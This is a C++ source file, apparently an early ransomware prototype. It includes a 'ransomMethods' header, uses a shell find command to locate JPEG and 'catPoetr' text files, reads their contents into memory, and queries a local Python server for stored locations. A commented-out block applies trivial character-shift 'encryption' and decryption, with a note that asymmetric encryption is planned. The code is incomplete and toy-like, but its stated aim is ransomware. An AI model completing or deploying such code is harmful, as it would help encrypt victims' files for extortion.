#include <string>
#include <iostream>
#include <fstream>
#include <vector>
#include "ransomMethods.h"
#include "HTTPRequest.hpp"

using namespace std;


int main(){  

	std::vector<std::string> fileLocationsVector;
	std::vector<std::string> temporaryVector; // TODO - Move to function.
	std::vector<std::vector<std::string>> fileContentVector;
	
	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.	
	
	if(getFileContents("fileLocations", fileLocationsVector)){		 // Read file locations into a string vector.
		for(string& location : fileLocationsVector){
			if(getFileContents(location, temporaryVector)){			 // Read contens of each location into its own into its own string vector.
				fileContentVector.push_back(temporaryVector);
				temporaryVector.clear();		
			}			
		}	
    	
    }


    //Get request to Python Server that returns the current stored locations.
    try{
	    
	    http::Request request{"http://127.0.0.1:5000/locations"};

	    // send a get request
	    const auto response = request.send("GET");
	    std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
	
	}
	catch (const std::exception& e){
	    std::cerr << "Request failed, error: " << e.what() << '\n';
	}

	//TODO - Create function to take locations from this string ^^^ and compare them to list of locations. Remove already stored locations.

	/*	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
	for(vector<std::string>& a: fileContentVector){
		for(string& b : a){
			basicEncryptContent(b);
		}
	}

	// DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
	for(vector<std::string>& a: fileContentVector){
		for(string& b : a){
			basicDecryptContent(b);
		}
	}    
	*/

	
    return 0;
}